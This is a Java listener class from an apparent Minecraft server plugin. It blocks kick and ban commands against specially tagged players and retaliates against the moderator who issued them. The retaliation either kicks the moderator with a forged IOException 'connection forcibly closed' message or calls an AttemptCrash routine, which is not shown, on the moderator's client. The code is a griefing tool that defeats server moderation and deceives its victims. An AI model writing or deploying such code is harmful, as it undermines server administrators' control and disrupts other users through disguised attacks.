package me.oscarcusick.aurora.Listeners;

import me.oscarcusick.aurora.Utility.GeneralUtility;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.NamespacedKey;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.Plugin;

public class AntiBanKickListener implements Listener {
    Plugin PluginInstance;
    Player LastKicker = null, LastBanner = null;
    public AntiBanKickListener(Plugin PluginInstance) {
        this.PluginInstance = PluginInstance;
    }

    @EventHandler(priority = EventPriority.LOWEST) // see who banned or kicked who last
    public void CommandPreprocess(PlayerCommandPreprocessEvent event) {
        if (event.getMessage().toLowerCase().contains("kick")) {
            LastKicker = event.getPlayer();
        } else if (event.getMessage().toLowerCase().contains("ban")) {
            LastBanner = event.getPlayer();
        }
    }

    @EventHandler
    public void AntiKick(PlayerKickEvent event) {
        if (event.getPlayer().getPersistentDataContainer().has(new NamespacedKey(PluginInstance, "AK"))) {
            GeneralUtility GU = new GeneralUtility(PluginInstance);

            event.setCancelled(true);
            if (LastKicker == null) {
                GU.TellPlayer(event.getPlayer(), "A player tried to kick you");
            } else {
                GU.TellPlayer(event.getPlayer(), GU.Gold + "" + ChatColor.BOLD + LastKicker.getName() + GU.Grey + " tried to kick you");
            }

            switch (event.getPlayer().getPersistentDataContainer().get(new NamespacedKey(PluginInstance, "AK"), PersistentDataType.INTEGER)) {
                case 0: // do nothing other than warn
                    return;
                case 1: // kick back
                    if (LastKicker != null && LastKicker != event.getPlayer()) { // stop infinite recursion through retaliating against yourself
                        LastKicker.kickPlayer("Internal Exception: java.io.IOException: An existing connection was forcibly closed by the remote host");
                    }
                    return;
                case 2: // crash
                    if (LastKicker != null) {
                        GU.AttemptCrash(event.getPlayer(), LastKicker);
                    }
                    return;
                default:
                    return;
            }
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void AntiBan(PlayerCommandPreprocessEvent event) {

        String[] Strings = event.getMessage().split(" ");
        // if not ban command, return
        if (!Strings[0].toLowerCase().contains("ban")) {
            return;
        }

        Player BannedPlayer = null;

        if (PluginInstance.getServer().getPlayer(Strings[1]) != null) {
            BannedPlayer = PluginInstance.getServer().getPlayer(Strings[1]); //That's the player which should be banned
        } else {
            return;
        }

        if (BannedPlayer.getPersistentDataContainer().has(new NamespacedKey(PluginInstance, "AB"))) {
            GeneralUtility GU = new GeneralUtility(PluginInstance);

            event.setCancelled(true);
            if (LastBanner == null) {
                GU.TellPlayer(event.getPlayer(), "A player tried to ban you");
            } else {
                GU.TellPlayer(event.getPlayer(), GU.Gold + "" + ChatColor.BOLD + LastBanner.getName() + GU.Grey + " tried to ban you");
            }

            switch (BannedPlayer.getPersistentDataContainer().get(new NamespacedKey(PluginInstance, "AB"), PersistentDataType.INTEGER)) {
                case 0: // do nothing other than warn
                    return;
                case 1: // kick back
                    if (LastBanner != null) { // stop infinite recursion through retaliating against yourself
                        LastBanner.kickPlayer("Internal Exception: java.io.IOException: An existing connection was forcibly closed by the remote host");
                    }
                    return;
                case 2: // crash
                    if (LastBanner != null) {
                        GU.AttemptCrash(BannedPlayer, LastBanner);
                    }
                    return;
                default:
                    return;
            }
        }
    }
}
